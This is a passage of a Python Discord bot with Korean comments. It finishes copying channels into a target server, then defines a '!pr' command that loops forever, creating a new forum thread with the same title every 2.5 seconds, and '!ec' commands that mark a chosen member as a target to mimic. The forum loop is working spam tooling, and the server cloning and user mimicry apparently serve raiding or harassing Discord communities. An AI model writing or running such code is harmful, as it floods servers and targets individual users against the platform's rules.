                new_channel = await target.create_stage_channel(
                    name=channel.name,
                    category=category_map.get(channel.category_id),
                    overwrites=overwrites
                )

            if new_channel:
                channel_cache.append((new_channel, channel.position))

            await asyncio.sleep(0.3)

        except:
            pass

    # ======================
    # 🔥 6. 채널 순서 정렬 (후처리)
    # ======================
    try:
        for ch, pos in sorted(channel_cache, key=lambda x: x[1]):
            await ch.edit(position=pos)
            await asyncio.sleep(0.1)
    except:
        pass

running = False
forum_id_global = None
title_global = None


# 🔥 반복 실행 (포럼 글 생성)
@tasks.loop(seconds=2.5)
async def forum_loop():
    global running, forum_id_global, title_global

    if not running:
        return

    forum = client.get_channel(forum_id_global)
    if forum is None:
        return

    try:
        await forum.create_thread(
            name=title_global,
            content=f"-# {title_global}"
        )
    except Exception as e:
        print("에러:", e)


# ▶ 시작 (!pr 포럼ID 제목)
@client.command()
async def pr(ctx, forum_id: int, *, title: str):
    global running, forum_id_global, title_global

    forum_id_global = forum_id
    title_global = title
    running = True

    if not forum_loop.is_running():
        forum_loop.start()

    await ctx.send(f"-# 포럼 매크로 시작됨: {title}")


# ▶ 중지 (!prs)
@client.command()
async def prs(ctx):
    global running

    running = False
    forum_loop.stop()

    await ctx.send("-# 포럼 매크로 중지됨")

# ======================
# ▶ EC 변수
# ======================
ec_target = None
ec_enabled = False


# ======================
# ▶ EC 시작
# ======================
@client.command(name="ec")
async def ec_start(ctx, member: discord.Member):
    global ec_target, ec_enabled

    ec_target = member.id
    ec_enabled = True

    await ctx.send(f"-# {member.name} 따라하기 시작")


# ======================
# ▶ EC 종료
# ======================
@client.command(name="ect")
async def ec_stop(ctx):
    global ec_target, ec_enabled

    ec_target = None
    ec_enabled = False

    await ctx.send("-# 따라하기 종료")

if __name__ == "__main__":
    try:
        loop.run_until_complete(_main())
    except:
        pass